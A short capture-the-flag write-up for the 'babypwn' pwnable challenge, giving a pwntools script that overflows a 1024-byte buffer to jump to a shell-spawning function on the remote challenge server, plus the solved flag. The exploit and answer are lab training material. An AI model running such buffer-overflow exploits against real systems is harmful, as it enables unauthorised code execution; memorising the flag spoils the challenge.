# babypwn

## Pwnable - Points: 1

> This Challenge remake...<br>
>
> i want many solve!!!<br>
>
> do you know Buffer Overflow???<br>
>
> <br>
>
> nc prob.vulnerable.kr 20035
>
> <br>
>
> Author : 이도현
>
> [babypwn](babypwn)
>

Overflow the buffer with 1024 bytes + 8 bytes EBP to get code execution. The binary contains two flag functions, where `flag2` spawns a shell, so simply jump to that function.

Exploit script:

```python
from pwn import *

# p = process('babypwn')
p = remote('prob.vulnerable.kr', 20035)

flag2 = 0x400636

p.sendline('A' * 1024 + 'A' * 8 + p64(flag2))
p.interactive()
```

flag: `KorNewbie{Th1s_1S_R34L_Fl4g_C0ngr4tu14ti0n5!}`